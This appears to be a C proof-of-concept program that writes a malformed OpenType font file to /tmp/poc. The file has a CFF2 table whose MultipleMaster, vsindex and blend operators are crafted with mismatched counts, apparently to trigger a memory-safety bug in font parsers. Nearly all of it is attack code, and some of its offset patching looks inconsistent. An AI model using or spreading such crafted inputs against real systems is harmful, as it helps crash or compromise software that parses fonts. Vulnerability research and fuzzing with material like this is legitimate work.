#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_be16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_be32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header (sfVersion = 'OTTO') */
    fputc(0x4F, f); fputc(0x54, f); fputc(0x54, f); fputc(0x4F, f);
    write_be16(f, 1); write_be16(f, 0); write_be16(f, 0); write_be16(f, 0);

    /* Table record for 'CFF2' */
    fputc(0x43, f); fputc(0x46, f); fputc(0x46, f); fputc(0x32, f);
    write_be32(f, 0);
    long offset_pos = ftell(f);
    write_be32(f, 0);
    write_be32(f, 0);

    /* CFF2 data */
    long cff_start = ftell(f);

    /* CFF2 Header: 5 bytes */
    fputc(0x02, f); fputc(0x00, f); fputc(0x05, f); fputc(0x04, f); fputc(0x00, f);

    /* Top DICT INDEX (32-bit count, 4-byte offsets) */
    long topdict_idx_start = ftell(f);
    write_be32(f, 1); /* count = 1 */
    fputc(0x04, f); /* offSize = 4 (32-bit offsets) */
    write_be32(f, 1); /* offset[0] = 1 */
    /* placeholder for offset[1] - will patch later */
    long offset1_pos = ftell(f);
    write_be32(f, 0);
    long topdict_data_start = ftell(f);

    /* Top DICT data */
    /* MultipleMaster: num_designs=2, num_axes=1, SID=259, def=0, min=0, max=0 */
    fputc(0x8D, f); /* push 2 */
    fputc(0x8C, f); /* push 1 */
    fputc(0x1C, f); write_be16(f, 259); /* SID 259 */
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f); /* def, min, max */
    fputc(0x0C, f); fputc(0x18, f); /* MultipleMaster (0x118 = 280) */

    /* Private DICT reference: <size> <offset> 0x19 */
    long priv_ref_pos = ftell(f);
    fputc(0x8B, f); fputc(0x8B, f); /* placeholders */
    fputc(0x19, f); /* Private DICT operator */

    /* CharStrings operator: <offset> 0x11 */
    long cs_op_pos = ftell(f);
    fputc(0x8B, f); /* placeholder */
    fputc(0x11, f); /* CharStrings operator */

    long topdict_data_end = ftell(f);
    long topdict_data_size = topdict_data_end - topdict_data_start;

    /* Patch offset[1] in Top DICT INDEX */
    fseek(f, offset1_pos, SEEK_SET);
    write_be32(f, 1 + topdict_data_size);

    fseek(f, topdict_data_end, SEEK_SET);

    /* Global Subr INDEX (empty: 32-bit count = 0) */
    write_be32(f, 0);

    /* --- Private DICT --- */
    long private_start = ftell(f);
    /* vsindex 0: push 0 (0x8B), opcode 22 (0x16) */
    fputc(0x8B, f); fputc(0x16, f);
    /* First blend: default=0, coord=0, base=0, numBlends=2, opcode 23 (0x17) */
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f); fputc(0x8D, f);
    fputc(0x17, f);
    /* Second blend: default=0, coord=0, base=0, numBlends=1, opcode 23 (0x17) */
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8B, f); fputc(0x8C, f);
    fputc(0x17, f);
    long private_end = ftell(f);
    long private_size = private_end - private_start;
    long private_offset = private_start - cff_start;

    /* Patch Private DICT reference */
    fseek(f, priv_ref_pos, SEEK_SET);
    if (private_size <= 107) {
        fputc(private_size + 139, f);
    } else {
        fputc(0x1C, f);
        write_be16(f, (uint16_t)private_size);
    }
    if (private_offset <= 107) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        write_be16(f, (uint16_t)private_offset);
    }

    fseek(f, private_end, SEEK_SET);

    /* CharStrings INDEX (32-bit count, 1-byte offsets since small) */
    long charstrings_start = ftell(f);
    write_be32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x02, f);
    fputc(0x0E, f);

    long charstrings_end = ftell(f);
    long charstrings_offset = charstrings_start - cff_start;

    /* Patch CharStrings offset */
    fseek(f, cs_op_pos, SEEK_SET);
    if (charstrings_offset <= 107) {
        fputc(charstrings_offset + 139, f);
    } else {
        fputc(0x1C, f);
        write_be16(f, (uint16_t)charstrings_offset);
    }

    fseek(f, charstrings_end, SEEK_SET);
    long cff_end = ftell(f);
    long cff_size = cff_end - cff_start;

    fseek(f, offset_pos, SEEK_SET);
    write_be32(f, (uint32_t)cff_start);
    write_be32(f, (uint32_t)cff_size);

    fclose(f);
    return 0;
}